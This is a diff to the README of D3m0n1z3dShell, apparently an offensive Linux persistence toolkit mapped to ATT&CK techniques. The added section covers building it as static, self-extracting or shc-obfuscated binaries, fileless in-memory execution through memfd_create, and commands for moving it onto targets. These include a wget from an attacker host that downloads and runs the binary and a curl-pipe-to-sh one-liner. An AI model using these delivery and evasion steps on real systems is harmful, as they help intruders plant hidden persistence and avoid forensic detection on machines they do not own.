@@ -125,6 +125,68 @@ sudo curl -s https://raw.githubusercontent.com/MatheuZSecurity/D3m0n1z3dShell/ma
 * Process Name Masquerading — T1036.005 (trusted path mimic, legitimate process names)
 * Secure Deletion & Indicator Removal — T1070.004 (multi-pass wipe, forensic artifact cleanup)
 
+## Building Binary Versions
+
+D3m0n1z3dShell can be compiled into standalone executables for targets where bash or script execution is restricted.
+
+### Quick Start
+
+```bash
+chmod +x build.sh
+./build.sh              # Build static ELF binary (recommended)
+./build.sh all          # Build all three variants
+./build.sh clean        # Remove build artifacts
+```
+
+### Build Modes
+
+| Mode | Command | Target Requirements | Output | Best For |
+|------|---------|-------------------|--------|----------|
+| **Static ELF** | `./build.sh static` | **None** (zero deps) | `build/d3m0nized` | Hardened/minimal systems |
+| **Self-Extracting** | `./build.sh sfx` | `/bin/sh` + `tar` | `build/d3m0nized-sfx` | Full toolkit with all tools |
+| **shc Compiled** | `./build.sh shc` | `bash` | `build/d3m0nized-shc` | Quick obfuscated binary |
+
+### Build Requirements (on Kali / Debian)
+
+```bash
+sudo apt install build-essential bash-static   # For static & sfx modes
+sudo apt install shc                           # For shc mode only
+```
+
+### How the Static Binary Works
+
+1. `objcopy` embeds a static bash interpreter and the complete script as ELF data sections
+2. A C loader extracts them into anonymous memory file descriptors (`memfd_create`, kernel 3.17+)
+3. `fork()` + `execve(/proc/self/fd/N)` runs bash from memory with the script from memory
+4. **No files touch the filesystem** — fully fileless execution
+5. Falls back to unlinked temp files in `/dev/shm` on older kernels
+
+### Transfer to Target
+
+```bash
+# SCP
+scp build/d3m0nized user@target:/tmp/
+ssh user@target "chmod +x /tmp/d3m0nized && /tmp/d3m0nized"
+
+# HTTP server
+python3 -m http.server 8080 --directory build/
+# On target:
+wget http://KALI:8080/d3m0nized -O /tmp/d3m0nized && chmod +x /tmp/d3m0nized && /tmp/d3m0nized
+
+# Fileless via curl pipe (sfx mode)
+curl -sL http://KALI:8080/d3m0nized-sfx | sh
+```
+
+### Architecture Support
+
+The build system auto-detects the host architecture. Supported:
+- `x86_64` (amd64)
+- `aarch64` (arm64)
+- `i686` / `i386` (x86 32-bit)
+- `armv7l` (ARM 32-bit)
+
+To cross-compile, set `CC` to your cross-compiler and provide a static bash for the target arch.
+
 ### Pending Features
 
 And other types of features that will come in the future.
